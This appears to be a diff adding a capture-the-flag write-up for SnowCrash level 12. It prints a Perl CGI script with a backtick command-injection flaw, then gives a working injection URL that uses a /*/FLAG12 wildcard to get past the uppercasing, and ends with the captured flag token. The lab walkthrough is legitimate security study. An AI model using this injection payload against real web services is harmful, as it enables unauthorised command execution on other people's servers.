@@ -1,0 +1,59 @@
+$> ls -la
+We have a level12.pl file
+
+$> level12@SnowCrash:~$ cat level12.pl 
+#!/usr/bin/env perl
+# localhost:4646
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+
+sub t {
+  $nn = $_[1]; //equal to arg[1]
+  $xx = $_[0];	// equal to arg[0]
+  $xx =~ tr/a-z/A-Z/;  // transform everything to uppercase
+  $xx =~ s/\s.*//; // substitute, deletes everything after a space
+  @output = `egrep "^$xx" /tmp/xd 2>&1`; // egrep is a command, which is executed inside ``
+  foreach $line (@output) {
+      ($f, $s) = split(/:/, $line);
+      if($s =~ $nn) {
+          return 1;
+      }
+  }
+  return 0;
+}
+
+sub n {
+  if($_[0] == 1) {
+      print("..");
+  } else {
+      print(".");
+  }    
+}
+
+n(t(param("x"), param("y")));
+
+
+in a navigator:
+http://192.168.56.101:4646/?x=%22hello%22
+we get ".."
+
+Because of the script transforming everything into uppercase, we can't put `getflag` in executing commands is case-sensitive
+Let's try putting the command in a file
+level12@SnowCrash:/tmp$ vim FLAG12
+level12@SnowCrash:/tmp$ cat FLAG12
+#!/bin/sh
+getflag > /tmp/flag
+
+chmod +x /tmp/FLAG12
+
+Now, we need to pass the file as a parameter in the url:
+http://192.168.56.101:4646/?x="`/tmp/FLAG12`" will not work as the script will transform the path to /TMP/FLAG12
+
+Let's use a wildcard:
+http://192.168.56.101:4646/?x="`/*/FLAG12`"
+
+
+level12@SnowCrash:/tmp$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+
+--> su level13
